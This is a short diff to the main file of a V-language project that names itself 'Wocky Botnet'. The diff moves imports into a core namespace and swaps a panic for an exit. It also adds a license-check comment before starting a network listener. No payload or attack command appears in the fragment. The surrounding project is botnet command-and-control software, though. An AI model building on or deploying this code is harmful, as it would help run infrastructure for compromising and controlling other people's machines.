@@ -5,33 +5,36 @@
 @creator: vZy
 
 */
-import server
-import auth
-import wocky_cp
-import wocky_uix
-import wocky_utils
-import config
-import banner_sys
-import utils
+
+
+// importing modules
 import os
 import io
 import net
 import net.http
 import time
-// #include "@VROOT/c_headers/test.c"
-// #include <unistd.h>
-// fn read(int, string, int) int
-fn C.check()
-// fn C.fdopen(int, string)
+// Importing sub-modules
+import core.server
+import core.auth
+import core.wocky_cp
+import core.wocky_uix
+import core.wocky_utils
+import core.config
+import core.banner_sys
+import core.utils
 
 fn main() {
-	// C.check()
 	time.sleep(5)
 	println(config.Clear)
 	mut port := wocky_cp.port_check(os.args)
 	wocky_cp.conn_check() or {
-		panic("[x] Error, You have no internet on this box to host Wocky Botnet!\r\n")
+		println("[x] Error, You have no internet on this box to host Wocky Botnet!\r\n")
+		exit(0)
 	}
+
+
+	// Wocky License Verifcation
+
 	//wocky_cp.check_update()
 	//wocky_cp.licence_valiation()
 	go listener(port)
